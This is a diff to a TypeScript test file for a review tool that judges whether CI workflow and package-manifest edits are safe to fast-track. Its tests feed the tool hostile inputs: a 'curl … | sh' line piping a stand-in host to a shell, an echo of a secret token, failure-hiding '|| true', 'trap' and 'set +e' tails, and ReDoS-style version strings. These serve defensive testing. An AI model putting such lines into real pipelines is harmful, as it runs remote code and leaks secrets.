@@ -51,32 +51,59 @@ const LINT_APPENDED = CI.replace(
   `lint_command: npm run lint && (npm run tidy:check || echo "::warning title=tidy::tidy check failed")\n`,
 );
 
-test("workflow: given an append to a with: input, a run: block or a new with: input, then the edit is additive and names it", () => {
+test("workflow: given a guarded `&& <command>` appended to a with: input or a run: string, then the edit is additive and names it", () => {
   expect(workflowEdit(CI, LINT_APPENDED)).toEqual({
     additive: true,
     detail: "jobs.lint.with.lint_command appended",
   });
-  expect(workflowEdit(CI, CI.replace("npm test\n", "npm test\n          npm run e2e\n"))).toEqual({
-    additive: true,
-    detail: "jobs.test.steps[1].run appended",
-  });
   expect(
-    workflowEdit(CI, CI.replace("- run: npm run build", "- run: npm run build -- --prod")),
-  ).toEqual({
-    additive: true,
-    detail: "jobs.build.steps[0].run appended",
-  });
-  expect(
-    workflowEdit(
-      CI,
-      CI.replace("lint_command: npm run lint\n", "lint_command: npm run lint\n      node: '22'\n"),
-    ),
-  ).toEqual({ additive: true, detail: "jobs.lint.with.node added" });
+    workflowEdit(CI, CI.replace("- run: npm run build", "- run: npm run build && npm run size")),
+  ).toEqual({ additive: true, detail: "jobs.build.steps[0].run appended" });
   // A comment alone stays code: it can steer a tool.
   expect(workflowEdit(CI, `# the CI\n${CI}`)).toEqual({
     additive: false,
     detail: "changes only comments or layout, read as code",
   });
+});
+
+test("workflow: given an appended text that can hide a failure, a new line or a new input, then the edit stays full", () => {
+  const appended = (from: string, to: string) => workflowEdit(CI, CI.replace(from, to)).detail;
+  const lint = "jobs.lint.with.lint_command";
+  const build = "jobs.build.steps[0].run";
+  // The review's probes.
+  expect(appended("npm run lint\n", "npm run lint || true\n")).toBe(
+    `appends a command not chained with a leading && to ${lint}`,
+  );
+  expect(appended("- run: npm run build", "- run: npm run build || true")).toBe(
+    `appends a command not chained with a leading && to ${build}`,
+  );
+  expect(
+    appended("- run: npm run build", "- run: npm run build; curl -s https://x.example | sh"),
+  ).toBe(`appends a command not chained with a leading && to ${build}`);
+  for (const [tail, why] of [
+    [" && npm run x || true", "a || outside a group, which can hide a failure"],
+    [" && npm run x; true", "a ; that can run past a failure"],
+    [" && curl -s https://x.example | sh", "a | that can run past a failure"],
+    [" && npm run x &", "a & that can run past a failure"],
+    [" && exit 0", "exit, set +e, trap or a command substitution"],
+    [" && set +e", "exit, set +e, trap or a command substitution"],
+    [" && trap '' ERR", "exit, set +e, trap or a command substitution"],
+    [" && echo $(id)", "exit, set +e, trap or a command substitution"],
+    [" && echo `id`", "exit, set +e, trap or a command substitution"],
+    [" && (npm run x || true", "an unclosed quote or group"],
+    [" && echo ${{ secrets.NPM_TOKEN }}", "an expression"],
+  ] as const)
+    expect(appended("- run: npm run build", `- run: npm run build${tail}`)).toBe(
+      `appends ${why} to ${build}`,
+    );
+  // A new line in a run: block is a new command, not an append to the last one.
+  expect(appended("npm test\n", "npm test\n          npm run e2e\n")).toBe(
+    "appends a new line to jobs.test.steps[1].run",
+  );
+  // Only an existing input may grow; a new one is a change.
+  expect(
+    appended("lint_command: npm run lint\n", "lint_command: npm run lint\n      node: '22'\n"),
+  ).toBe("adds the input jobs.lint.with.node");
 });
 
 test("workflow: given a guarded key, a removal, a replaced string or an unreadable file, then the edit stays full naming why", () => {
@@ -113,7 +140,7 @@ test("workflow: given a guarded key, a removal, a replaced string or an unreadab
     "changes jobs.lint.with.lint_command",
   );
   expect(
-    refused(CI.replace("npm run lint\n", "npm run lint ${{ secrets.NPM_TOKEN }}\n")).detail,
+    refused(CI.replace("npm run lint\n", "npm run lint && echo ${{ secrets.NPM_TOKEN }}\n")).detail,
   ).toBe("appends an expression to jobs.lint.with.lint_command");
   expect(
     refused(
@@ -225,7 +252,47 @@ test("manifests: given package.json pins moved and a new script, then only pins 
     "changes main",
   );
   expect(why("{")).toBe("does not parse");
+  // A new script an existing one already runs by glob, or a pnpm: hook, joins what runs.
+  const runAll = PKG.replace('"lint": "eslint ."', '"lint": "run-s \'lint:*\'"');
+  expect(
+    manifestEdit(
+      "package.json",
+      runAll,
+      runAll.replace(
+        '"lint": "run-s \'lint:*\'"',
+        '"lint": "run-s \'lint:*\'",\n    "lint:extra": "x"',
+      ),
+    ).why,
+  ).toBe("adds the script lint:extra, which the script lint runs by glob");
+  expect(
+    why(
+      PKG.replace('"lint": "eslint ."', '"lint": "eslint .",\n    "pnpm:devPreinstall": "node x"'),
+    ),
+  ).toBe("adds the pnpm: script pnpm:devPreinstall");
+  // Ranges read as versions; a long hostile one is refused, not backtracked over.
+  expect(
+    manifestEdit("package.json", PKG, PKG.replace('"4.1.0"', '">= 4.1.0 < 5 || 6.x"')).pins,
+  ).toBe(true);
+  expect(manifestEdit("package.json", PKG, PKG.replace('"4.1.0"', '"4.1.0 - 4.9.9"')).pins).toBe(
+    true,
+  );
+  const hostile = `${"1 ".repeat(2_500)}!`;
+  expect(why(PKG.replace('"4.1.0"', JSON.stringify(hostile)))).toBe(
+    "changes the source of @acme/ui",
+  );
 });
+
+test("manifests: a 5,000-character pathological version is read in linear time", () => {
+  // The old single regex backtracked exponentially on this; the test's own timeout bounds it.
+  for (const hostile of [
+    `${"1 ".repeat(2_100)}1.1.1.1.1 ${"1||".repeat(300)}x`,
+    // Under the length cap, so each comparator is matched.
+    `${"1.1 ".repeat(30)}${"1||".repeat(20)}1.1.1.1!`,
+  ]) {
+    const after = PKG.replace('"4.1.0"', JSON.stringify(hostile));
+    expect(manifestEdit("package.json", PKG, after).why).toBe("changes the source of @acme/ui");
+  }
+}, 1_000);
 
 test("manifests: go.mod, Cargo.toml and pyproject.toml pins move; a new module, source or other line does not", () => {
   const go =
@@ -266,6 +333,13 @@ test("manifests: go.mod, Cargo.toml and pyproject.toml pins move; a new module, 
   expect(manifestEdit("pyproject.toml", py, py.replace('name = "x"', 'name = "y"')).pins).toBe(
     false,
   );
+  // A one-line list compares the requirement names, not only the versions.
+  const flat = '[project]\nname = "x"\ndependencies = ["requests>=2.31", "base64x>=1.0"]\n';
+  expect(manifestEdit("pyproject.toml", flat, flat.replace(">=2.31", ">=2.32"))).toMatchObject({
+    pins: true,
+    bumped: 1,
+  });
+  expect(manifestEdit("pyproject.toml", flat, flat.replace("base64x", "base65x")).pins).toBe(false);
 });
 
 const file = (name: string, lines: number, extra: Partial<ChangedFile> = {}): ChangedFile => ({
@@ -290,17 +364,29 @@ test("lane: given a pin bump with a source change, then the lane is computed fro
   ).toBe("full");
 });
 
-test("lane: an additive workflow edit follows the rest of the diff; a refused, configured or risky-named one stays full", () => {
+test("lane: without a dependency bump an additive workflow edit is focused, never self or none; a refused, configured or risky-named one stays full", () => {
   expect(
     computeLane({ files: [file(".github/workflows/ci.yml", 1, additive), file("src/a.ts", 2)] }),
   ).toMatchObject({
-    lane: "self",
+    lane: "focused",
     riskFiles: [],
     reasons: [
+      "an additive workflow edit needs a non-author verdict unless it rides a dependency bump",
       "small change: 6 lines in 2 files, no risk path",
       "additive workflow edit: .github/workflows/ci.yml (jobs.lint.with.lint_command appended)",
     ],
   });
+  expect(
+    computeLane({ files: [file(".github/workflows/ci.yml", 1, additive), file("README.md", 2)] })
+      .lane,
+  ).toBe("focused");
+  // A large diff beside it still reads full.
+  expect(
+    computeLane({ files: [file(".github/workflows/ci.yml", 1, additive), file("src/a.ts", 300)] })
+      .lane,
+  ).toBe("full");
+  // GitLab CI never softens.
+  expect(computeLane({ files: [file(".gitlab-ci.yml", 1, additive)] }).lane).toBe("full");
   const refused = {
     workflow: { additive: false, detail: "changes permissions: (permissions.contents)" },
   };
